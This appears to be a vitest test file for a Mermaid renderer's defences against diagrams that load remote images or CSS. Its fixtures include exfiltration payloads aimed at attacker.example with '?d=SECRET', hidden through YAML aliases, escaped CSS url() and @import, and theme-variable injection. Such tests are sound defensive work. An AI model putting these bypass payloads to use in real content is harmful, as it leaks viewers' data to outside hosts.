/**
 * The picture a diagram fetches is read from what Mermaid PARSED, not from the text: the
 * shape-data block is YAML, and an anchor on a key in one mapping, reused as an alias in
 * another, spells `img` without writing it. Real Mermaid, parse only — nothing is drawn.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { aparteGlobalConfig, type AparteCodeLanguageContext } from '@aparte/core';
import { setupMermaidWith, type MermaidLike } from './core.js';
import { cssFetches, parsedFetchesImage } from './shape-data.js';

const ALIAS_BLOCK = 'flowchart LR\n  A@{\n    x:\n      &k img: "data:image/png;base64,AA"\n    *k : "https://attacker.example/alias-block?d=SECRET"\n  }\n  A --> B';
const ALIAS_LINE = 'flowchart LR\n  A@{ x: [ &k img: "data:image/png;base64,AA" ], *k : "https://attacker.example/alias-oneline?d=SECRET" }';
const REMOTE_PLAIN = 'flowchart LR\n  A@{ img: "https://attacker.example/plain" }';
const ICON = 'sequenceDiagram\nparticipant A\nproperties A: {"icon": "https://attacker.example/seq"}\nA->>A: hi';
const DETAILS = 'sequenceDiagram\nparticipant A\ndetails A: cfg-json\nA->>A: hi';

async function mermaidApi() {
    const mermaid = (await import('mermaid')).default;
    mermaid.initialize({ startOnLoad: false, securityLevel: 'strict', htmlLabels: false });
    return mermaid;
}

const fetches = async (source: string): Promise<boolean> => {
    const mermaid = await mermaidApi();
    return parsedFetchesImage(await mermaid.mermaidAPI.getDiagramFromText(source));
};

describe('parsedFetchesImage, on what real Mermaid parsed', () => {
    afterEach(() => { document.body.innerHTML = ''; });

    it.each([
        ['an anchor on a key in one mapping, an alias for the key in another (block)', ALIAS_BLOCK],
        ['the same in one line', ALIAS_LINE],
        ['a plain remote picture', REMOTE_PLAIN],
        ['an actor icon from properties', ICON],
    ])('refuses %s', async (_what, source) => {
        expect(await fetches(source)).toBe(true);
    });

    it('refuses an actor icon that `details` reads from an element of the page', async () => {
        document.body.innerHTML = '<script type="application/json" id="cfg-json">{"properties":{"icon":"https://attacker.example/details-icon"}}</script>';
        expect(await fetches(DETAILS)).toBe(true);
    });

    it.each([
        ['an inline picture', 'flowchart LR\n  A@{ img: "data:image/png;base64,AA", label: "x" }'],
        ['the word properties in a message', 'sequenceDiagram\nparticipant A\nA->>A: GET /listings/42/properties'],
        ['the word properties after the colon, in a rental diagram', 'sequenceDiagram\nUser->>API: list properties for sale\nAPI-->>User: 200'],
        ['the word img as a label in a diagram with shape data', 'flowchart LR\n  A@{ shape: rect, label: "Resize img" }'],
        ['a Windows path in a diagram with shape data', 'flowchart LR\n  A@{ shape: rect }\n  B["C:\\users\\me"]'],
        ['a plain flowchart', 'flowchart LR\n  A --> B'],
    ])('lets through %s', async (_what, source) => {
        expect(await fetches(source)).toBe(false);
    });
});

describe('the renderer, with real Mermaid to parse', () => {
    afterEach(() => {
        aparteGlobalConfig.reset();
        document.body.innerHTML = '';
    });

    async function drawn() {
        const real = await mermaidApi();
        const calls = { render: 0 };
        const mermaid: MermaidLike = {
            initialize: (config) => real.initialize(config),
            parse: (text, options) => real.parse(text, options),
            render: () => { calls.render++; return Promise.resolve({ svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 60"><g><text>A</text></g></svg>' }); },
            mermaidAPI: real.mermaidAPI,
        };
        setupMermaidWith(mermaid);
        const host = document.createElement('code');
        document.body.append(host);
        return {
            calls,
            draw: (source: string) => aparteGlobalConfig.getCodeLanguageRenderer('mermaid')!.render(
                { language: 'mermaid', source, display: true, open: false, host, config: aparteGlobalConfig } as AparteCodeLanguageContext),
        };
    }

    it.each([
        ['an alias for the key (block)', ALIAS_BLOCK],
        ['an alias for the key (one line)', ALIAS_LINE],
    ])('never reaches render() with %s', async (_what, source) => {
        const { calls, draw } = await drawn();
        const html = await draw(source);
        expect(calls.render).toBe(0);
        expect(html).toContain('aparte-code-error');
    });

    it('draws a sequence diagram that only says "properties"', async () => {
        const { calls, draw } = await drawn();
        const html = await draw('sequenceDiagram\nUser->>API: GET /listings/42/properties\nAPI-->>User: 200');
        expect(calls.render).toBe(1);
        expect(html).toContain('aparte-diagram');
    });
});

describe('cssFetches', () => {
    it.each([
        ['a state classDef mask', 'stateDiagram-v2\nclassDef c mask-image:url(https://attacker.example/state?d=SECRET)\nS: hello\nclass S c'],
        ['a webkit mask', 'stateDiagram-v2\nclassDef c -webkit-mask-image:url(https://attacker.example/x)\nS: hello\nclass S c'],
        ['a background and a border image', 'stateDiagram-v2\nclassDef c background-image:url(https://attacker.example/a);border-image:url(https://attacker.example/b)\nclass S c'],
        ['a block classDef', 'block-beta\ncolumns 1\na\nclassDef c mask-image:url(https://attacker.example/block)\nclass a c'],
        ['image-set', 'stateDiagram-v2\nclassDef c mask-image:image-set("https://attacker.example/set" 1x)\nclass S c'],
        ['a CSS-escaped url', 'stateDiagram-v2\nclassDef c mask-image:\\75 rl(https://attacker.example/esc)\nclass S c'],
        ['url spelled with an escaped letter', 'stateDiagram-v2\nclassDef c mask-image:u\\rl(https://attacker.example/u_rl)\nclass S c'],
        ['url with an escaped l', 'stateDiagram-v2\nclassDef c mask-image:ur\\l(https://attacker.example/ur_l)\nclass S c'],
        ['image-set with an escaped s', 'stateDiagram-v2\nclassDef c mask-image:image-\\set("https://attacker.example/set" 1x)\nclass S c'],
        ['a block classDef with an escaped letter', 'block-beta\ncolumns 1\na\nclassDef c background:u\\rl(https://attacker.example/block)\nclass a c'],
        ['an escaped @import', 'stateDiagram-v2\nclassDef c fill:red\n%%{init: {"themeCSS": "@\\import ' + "'https://attacker.example/x.css'" + '"}}%%'],
        ['a slashless address', 'stateDiagram-v2\nclassDef c mask-image:url(https:attacker.example/slashless)\nclass S c'],
        ['an upper-case function', 'flowchart LR\n  A --> B\n  style A mask-image:URL(https://attacker.example/up)'],
        ['a flowchart style', 'flowchart LR\n  A --> B\n  style A background:url(https://attacker.example/s)'],
        ['an init theme variable', '%%{init: {"themeVariables": {"lineColor": "red;} *{background:url(https://attacker.example/t)}"}}}%%\nflowchart LR\n  A --> B'],
        ['a JSON-escaped function in an init', '%%{init: {"themeVariables": {"lineColor": "red;} *{background:\\u0075rl(https://attacker.example/t)}"}}}%%\nflowchart LR\n  A --> B'],
        ['cross-fade', 'stateDiagram-v2\nclassDef c mask-image:cross-fade(url(https://attacker.example/a), url(https://attacker.example/b), 50%)\nclass S c'],
        ['an @import', 'stateDiagram-v2\nclassDef c fill:red\n%%{init: {"themeCSS": "@import \'https://attacker.example/x.css\'"}}%%'],
    ])('refuses %s', (_what, source) => {
        expect(cssFetches(source)).toBe(true);
    });

    it.each([
        ['a plain state diagram', 'stateDiagram-v2\n[*] --> S\nS --> [*]'],
        ['a classDef with colours', 'stateDiagram-v2\nclassDef c fill:#f96,color:white,stroke-width:4px\nS: hello\nclass S c'],
        ['a function name inside a longer one', 'flowchart LR\n  A["obj.getURL(path)"] --> B["toURL(x)"]'],
        ['a Windows path in a diagram with no styling', 'flowchart LR\n  A["C:\\data\\files"] --> B'],
        ['a \\n in a label', 'flowchart LR\n  A["two\\nlines"] --> B'],
    ])('lets through %s', (_what, source) => {
        expect(cssFetches(source)).toBe(false);
    });
});
